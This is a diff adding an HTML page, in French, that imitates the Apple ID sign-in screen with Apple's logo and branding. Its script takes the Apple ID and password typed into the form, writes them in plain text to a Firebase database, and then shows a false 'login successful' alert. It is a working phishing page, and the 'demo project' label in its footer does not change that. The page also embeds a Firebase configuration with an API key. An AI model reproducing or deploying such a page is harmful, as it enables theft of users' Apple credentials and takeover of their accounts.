@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion Apple</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f3f4f6;
+    }
+    .container {
+      text-align: center;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    .logo {
+      width: 50px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 500;
+      color: #333;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+    input {
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      outline: none;
+    }
+    input:focus {
+      border-color: #007aff;
+      box-shadow: 0 0 3px rgba(0, 122, 255, 0.5);
+    }
+    button {
+      padding: 10px;
+      font-size: 16px;
+      background-color: #007aff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #005bb5;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Logo Apple" class="logo">
+    <h1>Connexion à l'identifiant Apple</h1>
+    <form id="loginForm">
+      <input type="text" id="name" placeholder="Identifiant Apple" required>
+      <input type="password" id="password" placeholder="Mot de passe" required>
+      <button type="submit">Se connecter</button>
+    </form>
+    <p class="footer">© 2024 - Projet Démo</p>
+  </div>
+
+  <script type="module">
+    // Import Firebase
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
+
+    // Configuration Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyAcI-zeWeBCU0NOAWz2yv2kGD9zsLwMT9Q",
+      authDomain: "appleloginsecurity-814a2.firebaseapp.com",
+      databaseURL: "https://appleloginsecurity-814a2-default-rtdb.firebaseio.com",
+      projectId: "appleloginsecurity-814a2",
+      storageBucket: "appleloginsecurity-814a2.firebasestorage.app",
+      messagingSenderId: "360943587359",
+      appId: "1:360943587359:web:ada37ba3018e35097b452a"
+    };
+
+    // Initialisation Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase();
+
+    // Fonction pour envoyer les données
+    function sendData(name, password) {
+      const userId = Date.now(); // Génère un ID unique
+      set(ref(db, 'users/' + userId), {
+        username: name,
+        password: password
+      });
+    }
+
+    // Gestion du formulaire
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const name = document.getElementById('name').value;
+      const password = document.getElementById('password').value;
+
+      sendData(name, password);
+      alert("Connexion réussie !");
+      form.reset(); // Réinitialise le formulaire
+    });
+  </script>
+</body>
+</html>
